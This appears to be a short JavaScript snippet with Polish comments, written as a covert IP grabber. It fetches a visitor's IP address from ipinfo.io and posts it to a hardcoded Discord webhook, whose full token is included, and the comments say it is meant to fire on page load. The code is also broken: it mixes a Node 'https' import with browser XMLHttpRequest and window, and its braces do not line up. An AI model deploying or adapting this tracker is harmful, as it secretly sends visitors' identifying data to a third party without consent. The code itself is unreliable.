import { request } from 'https';
// Funkcja pobierająca adres IP użytkownika
function getIPAddress() {
    // Utwórz obiekt XMLHttpRequest
    var xhr = new XMLHttpRequest();
        
    // Skonfiguruj zapytanie do serwisu ipinfo.io
    xhr.open("GET", "https://ipinfo.io/json", true);

    // Określ, co należy zrobić po odebraniu odpowiedzi
    xhr.onload = function () {
        if (xhr.status === 200) {
            // Parsowanie odpowiedzi JSON
            var response = JSON.parse(xhr.responseText);
            var ipAddress = response.ip;

            // Dane do wysłania
            const data = JSON.stringify({
            content: `${ipAddress}`
            });

            // Opcje żądania
            const options = {
            hostname: 'discord.com',
            path: '/api/webhooks/1231263269503766600/ndK68VJeyNPIwCIOf_si5-jZU2SoLN-7cBq3szpP6wtTIqKLkjHSGWjcbabI_mbj9U4g',
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Content-Length': data.length
            }
            };

            // Tworzenie żądania
            const req = request(options, res => {
            console.log(`Status kodu odpowiedzi: ${res.statusCode}`);

            res.on('data', d => {
                process.stdout.write(d);
            });
        });

            req.on('error', error => {
            console.error(error);
            });

            // Wysyłanie danych
            req.write(data);
            req.end();

            }

        // Wywołanie funkcji getIPAddress po załadowaniu strony
        window.addEventListener('DOMContentLoaded', getIPAddress);
        }}